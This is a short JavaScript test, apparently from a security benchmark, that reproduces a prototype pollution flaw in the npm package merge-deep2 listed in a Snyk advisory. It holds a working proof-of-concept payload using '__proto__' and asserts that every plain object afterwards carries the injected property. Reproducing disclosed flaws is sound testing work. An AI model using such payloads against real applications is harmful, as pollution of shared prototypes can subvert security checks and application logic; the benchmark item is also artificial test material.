//https://security.snyk.io/vuln/SNYK-JS-MERGEDEEP2-1727593
test("prototype pollution in merge-deep2", () => {
  const mergeDeep2 = require("merge-deep2");
  let obj = {};
  let malicious_payload = process.env.SECBENCH_PAYLOAD || (process.env.SECBENCH_PAYLOAD || '{"__proto__":{"polluted":"yes"}}');

  expect({}.polluted).toBe(undefined);

  mergeDeep2({}, JSON.parse(malicious_payload), true);
  expect({}.polluted).toBe("yes");
});
